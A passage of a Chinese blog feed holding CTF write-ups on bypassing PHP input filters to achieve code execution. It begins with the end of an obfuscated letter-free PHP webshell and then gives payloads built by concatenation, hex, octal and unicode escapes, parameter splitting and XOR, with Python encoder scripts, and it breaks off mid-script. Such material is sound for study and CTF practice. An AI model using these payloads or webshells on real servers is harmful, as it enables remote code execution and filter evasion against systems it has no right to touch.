class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注意最后传入的时候记得URL编码一次<br>密码是<code>_</code>，POST传入 _=phpinfo(); //代码执行即可<br><strong>另外这里利用版本也是PHP 7.0.12及以下版本，估计还是assert()到PHP7改了的问题，</strong><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201049.png" alt="在这里插入图片描述"><br>这种方法的缺点就是：需要大量的字符。<br>也只能当作CTF中一种奇淫技巧，实际环境中，像D盾这样的检测工具，这样的payload符号熵值太大，一看就有问题，当然正常代码也怎么可能不包括字母数字，玩玩就好</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>正则绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈PHP代码执行中出现过滤限制的绕过执行方法</title>
    <url>/phpexecbypass.html</url>
    <content><![CDATA[<h1 id="浅谈PHP代码执行中出现过滤限制的绕过执行方法"><a href="#浅谈PHP代码执行中出现过滤限制的绕过执行方法" class="headerlink" title="浅谈PHP代码执行中出现过滤限制的绕过执行方法"></a>浅谈PHP代码执行中出现过滤限制的绕过执行方法</h1><blockquote>
<p>本篇文章总结于本人在CTF比赛中碰到的各种代码执行绕过方法</p>
</blockquote>
<p>转自末初大佬博客<a href="https://mochu.blog.csdn.net/article/details/104631142?spm=1001.2014.3001.5506">https://mochu.blog.csdn.net/article/details/104631142?spm=1001.2014.3001.5506</a></p>
<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><p>首先来看看在<code>PHP</code>中有哪些函数有代码执行的功能</p>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>最常见的代码执行函数，把字符串 code 作为PHP代码执行。</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">eval</span> <span class="token punctuation">(</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>检查一个断言是否为<code>false</code></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">5</span>
<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool
<span class="token number">12</span>
<span class="token constant">PHP</span> <span class="token number">7</span>
<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>assert()</code>会检查指定的<code>assertion</code>并在结果为<code>false</code>时采取适当的行动。在<code>PHP5</code>或<code>PHP7</code>中，如果<code>assertion</code>是字符串，它将会被<code>assert()</code>当做<code>PHP</code>代码来执行。</p>
<h3 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+/e"></a>preg_replace()+/e</h3><p>执行一个正则表达式的搜索和替换</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">preg_replace</span> <span class="token punctuation">(</span> mixed <span class="token variable">$pattern</span> <span class="token punctuation">,</span> mixed <span class="token variable">$replacement</span> <span class="token punctuation">,</span> mixed <span class="token variable">$subject</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>搜索<code>subject</code>中匹配<code>pattern</code>的部分，以<code>replacement</code>进行替换。如果<code>pattern</code>的模式修饰符使用<code>/e</code>，那么当<code>subject</code>被匹配成功时，<code>replacement</code>会被当做PHP代码执行</p>
<blockquote>
<p>PS： <code>preg_replace()+</code>函数的<code>/e</code>修饰符在<code>PHP7</code>中被移除</p>
</blockquote>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193146.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193147.png" alt="在这里插入图片描述"></p>
<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>创建一个匿名（lambda样式）函数</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span> <span class="token punctuation">(</span> string <span class="token variable">$args</span> <span class="token punctuation">,</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造payload传递给<code>create_function()</code>对<code>参数或函数体</code>闭合注入恶意代码导致代码执行<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193148.png" alt="在这里插入图片描述"></p>
<h2 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><p>为数组的每个元素应用回调函数</p>
<pre class="line-numbers language-bash"><code class="language-bash">array_map <span class="token punctuation">(</span> callable <span class="token variable">$callback</span> , array <span class="token variable">$array</span> , array <span class="token punctuation">..</span>.<span class="token variable">$arrays</span> <span class="token punctuation">)</span> <span class="token keyword">:</span> array<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>返回数组，是为<code>array</code>每个元素应用<code>callback</code>函数之后的数组。 <code>array_map()</code>返回一个<code>array</code>，数组内容为<code>array1</code>的元素按索引顺序为参数调用<code>callback</code>后的结果（有更多数组时，还会传入<code>arrays</code>的元素）。 <code>callback</code>函数形参的数量必须匹配<code>array_map()</code>实参中数组的数量。<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193149.png" alt="在这里插入图片描述"></p>
<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p>把第一个参数作为回调函数调用</p>
<pre class="line-numbers language-bash"><code class="language-bash">call_user_func <span class="token punctuation">(</span> callable <span class="token variable">$callback</span> <span class="token punctuation">[</span>, mixed <span class="token variable">$parameter</span> <span class="token punctuation">[</span>, mixed $<span class="token punctuation">..</span>. <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token keyword">:</span> mixed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193150.png" alt="在这里插入图片描述"></p>
<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><p>调用回调函数，并把一个数组参数作为回调函数的参数</p>
<pre class="line-numbers language-bash"><code class="language-bash">call_user_func_array <span class="token punctuation">(</span> callable <span class="token variable">$callback</span> , array <span class="token variable">$param_arr</span> <span class="token punctuation">)</span> <span class="token keyword">:</span> mixed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>把第一个参数作为回调函数<code>callback</code>调用，把参数数组作<code>param_arr</code>为回调函数的的参数传入。跟<code>array_map()</code>相似<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193151.png" alt="在这里插入图片描述"></p>
<h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h3><p>用回调函数过滤数组中的单元</p>
<pre class="line-numbers language-bash"><code class="language-bash">array_filter <span class="token punctuation">(</span> array <span class="token variable">$array</span> <span class="token punctuation">[</span>, callable <span class="token variable">$callback</span> <span class="token punctuation">[</span>, int <span class="token variable">$flag</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token keyword">:</span> array<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>依次将<code>array</code>数组中的每个值传递到<code>callback</code>函数。如果<code>callback</code>函数返回<code>true</code>，则<code>array</code>数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193152.png" alt="在这里插入图片描述"></p>
<h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><p>使用用户自定义的比较函数对数组中的值进行排序</p>
<pre class="line-numbers language-bash"><code class="language-bash">usort <span class="token punctuation">(</span> array <span class="token operator">&amp;</span><span class="token variable">$array</span> , callable <span class="token variable">$value_compare_func</span> <span class="token punctuation">)</span> <span class="token keyword">:</span> bool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p>
<p>当<code>PHP &lt; 5.6</code>时<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193153.png" alt="在这里插入图片描述"><br>当<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>时，php有一个<code>参数变长</code>特性<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193154.png" alt="在这里插入图片描述"><br>等等还有很多函数参数是可回调的，就不一一列举了。</p>
<p>接下来根据各种过滤情况来看看具体的一些绕过方法</p>
<h2 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h2><p>字符串拼接绕过适用于绕过过滤具体关键字的限制</p>
<blockquote>
<p>适用PHP版本：<code>PHP&gt;=7</code></p>
</blockquote>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193155.png" alt="在这里插入图片描述"></p>
<p>Payload:</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>p.h.p.i.n.f.o<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>sy.<span class="token punctuation">(</span>st<span class="token punctuation">)</span>.em<span class="token punctuation">)</span><span class="token punctuation">(</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>sy.<span class="token punctuation">(</span>st<span class="token punctuation">)</span>.em<span class="token punctuation">)</span><span class="token punctuation">(</span>who.ami<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>s.y.s.t.e.m<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>在PHP中不一定需要<code>引号(单引号/双引号)</code>来表示字符串。PHP支持我们声明元素的类型，比如<code>$name = (string)mochu7;</code>，在这种情况下，<code>$name</code>就包含字符串<code>"mochu7"</code>，此外，如果不显示声明类型，那么PHP会将<code>圆括号内的数据当成字符串</code>来处理</p>
</blockquote>
<h2 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h2><blockquote>
<p>适用PHP版本：<code>PHP&gt;=7</code></p>
</blockquote>
<p>以八进制表示的<code>\[0–7]{1,3}</code>转义字符会自动适配byte（如<code>"\400" == “\000”</code>）<br>以十六进制的<code>\x[0–9A-Fa-f]{1,2}</code>转义字符表示法（如<code>“\x41"</code>）<br>以Unicode表示的<code>\u{[0–9A-Fa-f]+}</code>字符，会输出为UTF-8字符串</p>
<p>注意这里转义后的字符必须双引号包裹传参</p>
<p>Payload处理脚本如下：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>

<span class="token keyword">def</span> <span class="token function">hex_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res_payload <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token string">"\\x"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        res_payload <span class="token operator">+=</span> i
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to hex: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">oct_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res_payload <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> oct<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        res_payload <span class="token operator">+=</span> i
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to oct: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">uni_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res_payload <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token string">"\\u{{{0}}}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        res_payload <span class="token operator">+=</span> i
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to unicode: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">'phpinfo'</span>
    hex_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    oct_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    uni_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Payload</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">"\x70\x68\x70\x69\x6e\x66\x6f"</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#phpinfo();</span>
<span class="token string">"\163\171\163\164\145\155"</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#system('whoami');</span>
<span class="token string">"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#system('whoami');</span>
<span class="token string">"\163\171\163\164\145\155"</span><span class="token punctuation">(</span><span class="token string">"\167\150\157\141\155\151"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#system('whoami');</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193156.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193157.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193158.png" alt="在这里插入图片描述"><br>另外，八进制的方法可以绕过<code>无字母传参</code>进行代码执行</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">"\163\171\163\164\145\155"</span><span class="token punctuation">(</span><span class="token string">"\167\150\157\141\155\151"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#system('whoami');</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193159.png" alt="在这里插入图片描述"></p>
<h2 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h2><blockquote>
<p>适用PHP版本：<code>无限制</code></p>
</blockquote>
<p>如果过滤了<code>引号(单引号/双引号)</code>，可以通过以下方法绕过<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193200.png" alt="在这里插入图片描述"></p>
<pre class="line-numbers language-bash"><code class="language-bash">GET:
?1<span class="token operator">=</span>system<span class="token operator">&amp;</span>2<span class="token operator">=</span>whoami
POST:
cmd<span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193201.png" alt="在这里插入图片描述"></p>
<pre class="line-numbers language-bash"><code class="language-bash">cmd<span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>1<span class="token operator">=</span>system<span class="token operator">&amp;</span>2<span class="token operator">=</span>whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果<code>PHP版本大于7</code>这里还可以用拼接的方法绕过过滤引号</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>sy.st.em<span class="token punctuation">)</span><span class="token punctuation">(</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193202.png" alt="在这里插入图片描述"><br>回调函数可能大部分看限制的具体长度，但是在<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>时对以上过滤方法可以绕过</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193203.png" alt="在这里插入图片描述"></p>
<h2 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h2><blockquote>
<p>适用于PHP版本：Windows本地测试的是<code>PHP&gt;=7</code>可以成功，<code>PHP5</code>测试虽然报错但是并不肯定不能使用</p>
</blockquote>
<p><code>get_defined_functions()</code>：返回所有已定义函数的数组</p>
<p>详情见：<a href="https://www.php.net/manual/zh/function.get-defined-functions.php">https://www.php.net/manual/zh/function.get-defined-functions.php</a></p>
<p>利用这种方法首先还需要知道PHP的具体版本，因为每个版本的<code>get_defined_functions()</code>返回的值都是不一样的，这里以<code>php7.4.3</code>为准<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193204.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193205.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193206.png" alt="在这里插入图片描述"></p>
<h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><blockquote>
<p>适用PHP版本：<code>无限制</code></p>
</blockquote>
<p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210422193207.png" alt="图一"></p>
<pre class="line-numbers language-bash"><code class="language-bash">字符：?         ASCII码：63           二进制：  00‭11 1111‬
字符：~         ASCII码：126          二进制：  0111 1110‬
异或规则：
1   XOR   0   <span class="token operator">=</span>   1
0   XOR   1   <span class="token operator">=</span>   1
0   XOR   0   <span class="token operator">=</span>   0
1   XOR   1   <span class="token operator">=</span>   0
上述两个字符异或得到 二进制：  0100 0001
该二进制的十进制也就是：65
对应的ASCII码是：A
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>接下来看一道例题：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"hacker!!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了<code>所有英文字母和数字</code>，但是我们知道ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</p>
<blockquote>
<p>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p>
</blockquote>
<p>脚本如下：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

payload <span class="token operator">=</span> <span class="token string">"assert"</span>
strlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#strlist是ascii表中所有非字母数字的字符十进制</span>
str1<span class="token punctuation">,</span>str2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>

<span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">^</span> j <span class="token operator">==</span> ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                i <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
